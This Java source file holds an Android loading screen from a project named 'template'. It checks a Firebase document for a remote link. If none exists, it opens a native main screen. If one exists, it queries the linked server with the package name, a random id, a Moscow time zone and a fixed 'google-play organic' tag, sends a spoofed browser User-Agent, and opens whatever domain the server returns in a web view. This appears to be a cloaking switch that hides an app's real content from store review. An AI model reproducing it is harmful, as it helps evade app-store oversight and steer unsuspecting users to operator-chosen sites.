package com.template;

import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import android.view.Window;
import android.view.WindowManager;
import android.widget.ProgressBar;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.annotations.concurrent.Background;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.UUID;

import static androidx.core.content.ContentResolverCompat.query;

public class LoadingActivity extends AppCompatActivity {
    public static String domen = "";
    public static URL url;
    private String uuid = UUID.randomUUID().toString();
    private static final String PREFS_FILE = "prefData";
    private static final String PREF_NAME = "web_Site";
    private static final String FIREBASE_EXISTS = "firebase";
    SharedPreferences settings;
    SharedPreferences.Editor prefEditor;
    private String uuidToUse = uuid.substring(uuid.length() - 12);
    private String timeZone = "Europe/Moscow";
    private String getr = "getr=utm_source=google-play&utm_medium=organic";
    private String domenFromFirebase;
    private ProgressBar progressBar;
    int i = 0;
    FirebaseFirestore db = FirebaseFirestore.getInstance();
    DocumentReference docRef = db.collection("database").document("check");
    SQLiteDatabase sqlite=null;
    Cursor query= null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_loading);

        sqlite = getBaseContext().openOrCreateDatabase("app.db", MODE_PRIVATE, null);
//        sqlite.execSQL("DROP TABLE IF EXISTS params");
        sqlite.execSQL("CREATE TABLE IF NOT EXISTS params (id INTEGER PRIMARY KEY AUTOINCREMENT, firebase INTEGER)");
        sqlite.execSQL("INSERT OR IGNORE INTO params(firebase) VALUES (0)");
        query = sqlite.rawQuery("SELECT * FROM params WHERE id=1", null);

        progressBar = findViewById(R.id.progress_bar);
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (i <= 100) {
                    progressBar.setProgress(i);
                    i++;
                    handler.postDelayed(this, 40);
                } else {
                    handler.removeCallbacks(this);
                }
            }
        }, 40);

        settings = getSharedPreferences(PREFS_FILE, MODE_PRIVATE);
//        prefEditor = settings.edit(); prefEditor.clear();prefEditor.apply();
        String name = settings.getString(PREF_NAME, "");
     //   String fire = settings.getString(FIREBASE_EXISTS,"");
        Log.d("HTTP-GET", "All PREFS " + settings.getAll());
        query.moveToFirst();
        Log.d("HTTP-GET", "Database Int: " + query.getInt(1));
      //  if (fire!="") {
        if (query.getInt(1)==1) {
            mainActivity();
            finish();
        }else if (name != "" && !name.isEmpty()) {
            domen = name;
            webActivity();
        } else{
            Log.d("HTTP-GET", "2 первых else пройдены");
            docRef.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
                @Override
                public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                    if (task.isSuccessful()) {
                        DocumentSnapshot document = task.getResult();Log.d("HTTP-GET", "document " + document);
                        if (document.exists()) {
                            domenFromFirebase = document.getString("link");
                            Log.d("HTTP-GET", "dbResponse: " + domenFromFirebase);
                            if (domenFromFirebase==null){
                                prefEditor = settings.edit();
                                prefEditor.putString(FIREBASE_EXISTS, "false");
                                prefEditor.apply();
                                Log.d("HTTP-GET", "PREFS FIREBASE FAILED " + settings.getAll());
                                sqlite.execSQL("UPDATE params SET firebase = 1 WHERE id='1'");
                                mainActivity();
                                finish();
                            }
                        }
                    } else {
                        mainActivity();
                        finish();
                    }
                    url = buildURL();
                    Log.d("HTTP-GET", "url got: " + url);

                    new Thread(new Runnable() {
                        public void run() {
                            try {
                                domen = makeRequest(url);
                                SharedPreferences.Editor prefEditor = settings.edit();
                                prefEditor.putString(PREF_NAME, domen);
                                prefEditor.apply();
                                Log.d("HTTP-GET", "PREFS WEBSITE WRITTEN " + settings.getAll());
                            } catch (IOException e) {
                                throw new RuntimeException(e);
                            }
                            webActivity();
                            finish();
                        }
                    }).start();

                    webActivity();
                }
            });
        }
    }

    @Override
    protected void onPause() {
        super.onPause();

        String name = domen;
        prefEditor = settings.edit();
        prefEditor.putString(PREF_NAME, name);
        prefEditor.apply();
        query.close();
        sqlite.close();
    }

    public void mainActivity() {
        Intent intent = new Intent(this, MainActivity.class);
        startActivity(intent);
        finish();
    }

    public void webActivity() {
        Intent intent = new Intent(this, WebActivity.class);
        finish();
        startActivity(intent);

    }

    private URL buildURL() {
        String PackageID = "packageid";
        String packageName = getApplicationContext().getPackageName();
        String USSERID = "usserid";
        String GETZ = "getz";
//        Uri buildUri = Uri.parse(domenFromFirebase+"/").buildUpon().appendQueryParameter(PackageID,packageName).appendQueryParameter(USSERID,uuidToUse).encodedQuery("getz=Europe/Moscow").appendQueryParameter("getr","utm_source=google-play").appendQueryParameter("utm_medium","organic").build();
        Uri buildUri = Uri.parse(domenFromFirebase + "/").buildUpon().encodedQuery("packageid=" + packageName + "&usserid=" + uuidToUse + "&getz=Europe/Moscow&getr=utm_source=google-play&utm_medium=organic").build();
        URL url = null;

        try {
            url = new URL(buildUri.toString());

        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        return url;
    }

    private String makeRequest(URL url) throws IOException {
        String body = "";
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent",
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2");
        connection.connect();

        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append('\n');
            }
            body = sb.toString();
        } catch (IOException e) {
            Intent intent = new Intent(this, MainActivity.class);
            startActivity(intent);
        } finally {
            connection.disconnect();
        }
        return body;
    }
}